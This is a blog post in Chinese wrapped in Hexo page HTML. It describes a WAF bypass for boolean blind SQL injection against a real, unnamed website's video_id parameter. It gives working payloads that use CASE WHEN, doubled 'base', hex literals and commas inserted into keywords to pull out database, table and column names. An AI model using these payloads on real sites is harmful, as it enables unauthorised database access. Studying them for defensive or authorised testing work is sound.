@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言这篇文章中的站点是以前发现的了，漏洞也是以前搞的，但是最近我觉着我大哥需要找点东西练练手，然后就把这个丢给了大哥，结果大哥总是在找理由推脱（大哥也想搞，但总是找借口说没时间），然后我跟大哥说，你再不搞我就直接把思路过程发给你，恶心大哥一手。没错，这篇文章就是拿来恶心我大哥一手的  注入过程这个站点好像是补天公益里面的一个，至于注入点是怎么找到的就记不清了，所以就直接开搞 and 1&#x3D;1，and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小破站的SQL绕过">
+<meta property="og:url" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="前言这篇文章中的站点是以前发现的了，漏洞也是以前搞的，但是最近我觉着我大哥需要找点东西练练手，然后就把这个丢给了大哥，结果大哥总是在找理由推脱（大哥也想搞，但总是找借口说没时间），然后我跟大哥说，你再不搞我就直接把思路过程发给你，恶心大哥一手。没错，这篇文章就是拿来恶心我大哥一手的  注入过程这个站点好像是补天公益里面的一个，至于注入点是怎么找到的就记不清了，所以就直接开搞 and 1&#x3D;1，and">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png">
+<meta property="og:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png">
+<meta property="article:published_time" content="2022-02-05T07:51:09.000Z">
+<meta property="article:modified_time" content="2022-04-30T07:53:47.131Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="用来恶心人的">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png">
+
+<link rel="canonical" href="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>小破站的SQL绕过 | Mechoy's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mechoy's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mechoy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mechoy's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          小破站的SQL绕过
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-02-05 15:51:09" itemprop="dateCreated datePublished" datetime="2022-02-05T15:51:09+08:00">2022-02-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-04-30 15:53:47" itemprop="dateModified" datetime="2022-04-30T15:53:47+08:00">2022-04-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章中的站点是以前发现的了，漏洞也是以前搞的，但是最近我觉着我大哥需要找点东西练练手，然后就把这个丢给了大哥，结果大哥总是在找理由推脱（大哥也想搞，但总是找借口说没时间），然后我跟大哥说，你再不搞我就直接把思路过程发给你，恶心大哥一手。没错，这篇文章就是拿来恶心我大哥一手的</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/1.png"></p>
+<h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><p>这个站点好像是补天公益里面的一个，至于注入点是怎么找到的就记不清了，所以就直接开搞</p>
+<p><code>and 1=1</code>，<code>and 1=2</code>,屡试不爽,结果GG，直接白屏啥都不显示好吧</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/2.png"></p>
+<p>and不行，那就试一下or，好家伙，也是不行，但是试一下直接<code>video_id=0 or 1</code>，因为1也是代表TRUE，不错，不错  可行，注意此时页面在会务小程序处反回了很多小视频</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/3.png"></p>
+<p>再试一下<code>video_id=0 or 0</code>，小视频没了，这基本可以确定布尔盲注没跑了</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/4.png"></p>
+<p>后面发现直接<code>video_id=0</code>和<code>video_id=1</code>也是能发现页面回显不一样的，那这里肯定要试一下报错</p>
+<p>既然是布尔盲注，那肯定要先判断一下database()的长度，不过这是问题就来了，一般布尔盲注肯定优先用if，</p>
+<p>直接尝试<code>video_id=0 or if(length(database())=10,1,0)</code></p>
+<p>直接报错</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/5.png"></p>
+<p>好家伙，直接报错，显示<code>())=1010</code>位置错误，而输入的是<code>if(length(database())=10,1,0)</code>,能够判断逗号 <strong>,</strong> 逗号无了，而if必须要使用逗号(在我的认知中是必须要使用逗号的)，作为菜鸡的我，一时间不知道该如何了。但这里需要记一下，逗号被过滤掉了，后面绕过过程中会用到</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/6.png"></p>
+<p>拿出我的MySQL手册，打开，翻找，发现我真菜，能就只有一个if嘛？？？肯定还有其他的判断语句，果不其然，有<code>when</code>,而且<code>when</code>还没有逗号，完美</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># when语句用法 condition是一个返回布尔类型的表达式，如果表达式返回true，则整个函数返回相应result的值，如果表达式皆为false，则返回ElSE后result的值，如果省略了ELSE子句，则返回NULL。</span><br><span class="line">CASE WHEN condition THEN result</span><br><span class="line">[WHEN...THEN...]</span><br><span class="line">ELSE result</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
+
+<p>尝试一下<code>video_id=0 or (case when 1=2 then 1 else 0 end)</code>和<code>video_id=0 or (case when 1=1 then 1 else 0 end)</code></p>
+<p>发现页面已经不报错了，并且返回内容也不相同，这样可以继续往下了</p>
+<p>再试一下<code>video_id=0 or (case when length(database())=10 then 1 else 0 end)</code>,好了，又不行</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/7.png"></p>
+<p>看来这里不是<code>length()</code>，就是<code>database()</code>的问题了</p>
+<p>先试一下<code>length()</code>能不能使用，<code>video_id=0 or (case when length(123)=3 then 1 else 0 end)</code>，</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/8.png"></p>
+<p>发现能用，那肯定是对<code>database()</code>进行了检测过滤</p>
+<p>那输入<code>video_id=0 or (case when length(zzzdataqqqbasexxx())=3 then 1 else 0 end)</code>来试一下，好家伙该有的基本没有，不该有的都有，但注意<code>database()</code>中的<code>base</code>被过滤掉了.（其实这里已经得到<code>database()</code>的值了，但这里是讲绕过，所以继续绕）</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/9.png"></p>
+<p><code>base</code>无了，那我写两个好吧，<code>video_id=0 or (case when length(datababasese())=8 then 1 else 0 end)</code></p>
+<p>成功，这就很nice了，得到<code>database()</code>的长度为8</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/10.png"></p>
+<p>开始爆数据库名，这里先尝试一下能否使用引号：<code>video_id=0 or (case when length(&#39;123&#39;)=3 then 1 else 0 end)</code></p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/11.png"></p>
+<p>算了，还是不用引号了吧，用<code>ascii()</code>这个函数，但是要记住的是这里不能使用逗号，引号</p>
+<p>而刚好<code>substring()</code>有一种不用引号的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substring(string from position for length)</span><br><span class="line"># 参数string指的是需要截取的原字符串</span><br><span class="line"># 数position指的是从哪个位置开始截取子字符串,若position为负数则从右往左开始数位置。</span><br><span class="line"># 参数length指的是需要截取的字符串长度，如果不写，则默认截取从position开始到最后一位的所有字符。</span><br></pre></td></tr></table></figure>
+
+<p>这里是一位一位判断的，所以可以忽略for，构造payload如下</p>
+<p><code>video_id=0 or (case when ascii(substring(datababasese() from -1))=121 then 1 else 0 end)</code></p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/12.png"></p>
+<p>成功获取到数据库名的最后一位是<strong>y</strong>，然后就一步步获取就可以了，最终得到数据库名为：<strong>news_wsy</strong>，与上面看到的一样</p>
+<p>接下来就是获取表名了，正常情况下直接把<code>datababasese()</code>换成<code>(select table_name from information_schema.tables where table_schema=&quot;数据库名&quot;)</code>就可以了，但这里肯定不正常0.0</p>
+<p>不能有引号：所以可以利用MySQL的特性将库名位置更改为16进制形式：0x6E6577735F777379</p>
+<p><code>video_id=0 or not (case when substring((select table_name from information_schema.tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else0 end)</code>,尝试一下这个payload</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/13.png"></p>
+<p>GG,直接参数不合法，参数不合法，那测一下哪些参数不合法</p>
+<p>先试一下select合不合法，因为这个是很多过滤规则中都会禁用的</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/14.png"></p>
+<p>果然不合法，像这种关键字一般可以使用内联注释、关键字替代、大小写等绕过方式，但这里，还可以使用逗号，在前面的绕过中发现逗号是会被过滤掉的，所以这里可以尝试一下在select中加个逗号，如果服务端是先进行select的检验，再删除逗号，那么这里就是可以行的，尝试之后，发现能够成功过来</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/15.png"></p>
+<p>然后继续往下尝试，一个单词一个单词的进行，看看服务端还检测了哪些，</p>
+<p>写到<code>video_id=0 or not (case when substring((sel,ect table_name from information_schema.tables)from 1 for 1)=0x61 then 1 else 0 end)</code>这里时发现又不行了，又提示参数不合法了</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/16.png"></p>
+<p>那基本上就是<code>information_schema.tables</code>的问题，经测试<code>information_schema</code>和<code>tables</code>单独存在时都没有问题，那么一定是<code>information_schema.tables</code>同时存在会被规则匹配到，那么这里可以更改成<code>informa,tion_sch,ema.tab,les</code>或者<code>information_schema . tables</code>(这种形式是在MySQL命令行中测试发现)，将payload更改为如下形式：</p>
+<p><code>video_id=0 or not (case when substring((sel,ect group_concat(table_name)from information_schema . tables where table_schema=0x6E6577735F777379)from 1 for 1)=0x61 then 1 else 0 end)</code></p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/17.png"></p>
+<p>成功，接下来就是繁琐的爆表，这里获取了前四个表的：addgunang,admin,announcement_list，获取表之后就是爆字段了，这里跟爆表没有太多区别，所以直接附上payload:</p>
+<p><code>video_id=0 or not(case when substring((sel,ect group_concat(column_name)from(information_schema . columns)where table_name=0x61646D696E)from 1 for 1)=0x61 then 1 else 0 end)</code></p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/18.png"></p>
+<p>成功，获取数据处基本上就没有什么绕过的内容了，所以写到这里就差不多了</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实这个注入点是很简单的，尤其是在发现服务端将逗号过滤掉之后，并且这个过滤逗号是在检测之后进行的，发现这个之后，后面注入基本上没有什么问题，遇到关键字检测就在关键字中加个逗号，这样就能绕过检测；另外就是MySQL中一些可以相互替换的函数，力推MySQL手册，看看这个找一找，有时候找官方文档比百度的快，基本上就这个样子了。另外文章中有一些Payload是直接复制的以前注入时留下的记录，所以可能有时候是<code>0 or (xxx)</code>，有时候是<code>0 or not(xxx)</code>，不过这些都差不多，没多大影响。这个位置个人感觉对练习绕过思路有一定帮助，所以记录下来。珍爱生命，不要扒拉数据，验证存在就好。</p>
+<p>最后，该去干正事了</p>
+<p><img src="/2022/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%9A%84SQL%E7%BB%95%E8%BF%87/19.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%94%A8%E6%9D%A5%E6%81%B6%E5%BF%83%E4%BA%BA%E7%9A%84/" rel="tag"># 用来恶心人的</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/" rel="prev" title="SQL注入&预编译">
+      <i class="fa fa-chevron-left"></i> SQL注入&预编译
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">注入过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mechoy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mechoy</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
